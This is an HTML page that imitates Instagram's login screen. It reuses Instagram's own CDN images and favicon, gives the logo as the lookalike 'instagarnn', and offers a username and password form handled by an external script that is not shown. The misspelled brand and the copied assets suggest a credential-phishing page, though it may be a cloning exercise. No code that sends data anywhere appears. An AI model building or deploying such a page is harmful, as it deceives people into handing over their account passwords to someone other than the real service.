
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
  <div class="main-container">
    <div class="phone-mockup">
      <img src="https://static.cdninstagram.com/rsrc.php/v3/y4/r/QN95VOQAo4Z.png" alt="Instagram phones">
    </div>
    
    <div class="auth-container">
      <div class="login-box">
        <div class="instagram-logo">
          <span class="instagram-text">instagarnn</span>
        </div>
        
        <form id="loginForm" class="login-form">
          <div class="input-container">
            <input type="text" name="username" placeholder="Phone number, username, or email" required />
          </div>
          <div class="input-container">
            <input type="password" name="password" placeholder="Password" required />
          </div>
          <button type="submit" class="login-button">Log in</button>
        </form>
        
        <div class="divider">
          <div class="divider-line"></div>
          <div class="divider-text">OR</div>
          <div class="divider-line"></div>
        </div>
        
        <button class="facebook-login">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
          </svg>
          Log in with Facebook
        </button>
        
        <a href="#" class="forgot-password">Forgot password?</a>
      </div>
      
      <div class="signup-box">
        <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
      </div>
      
      <div class="app-download">
        <p>Get the app.</p>
        <div class="app-buttons">
          <a href="#" class="app-button">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store">
          </a>
          <a href="#" class="app-button">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play">
          </a>
        </div>
      </div>
    </div>
  </div>

  <footer class="footer">
    <div class="footer-content">
      <nav class="footer-nav">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Top Accounts</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
      </nav>
      <div class="footer-bottom">
        <select class="language-selector">
          <option>English</option>
        </select>
        <span class="copyright">© 2024 Instagram from Meta</span>
      </div>
    </div>
  </footer>

  <script src="script.js"></script>
</body>
</html>
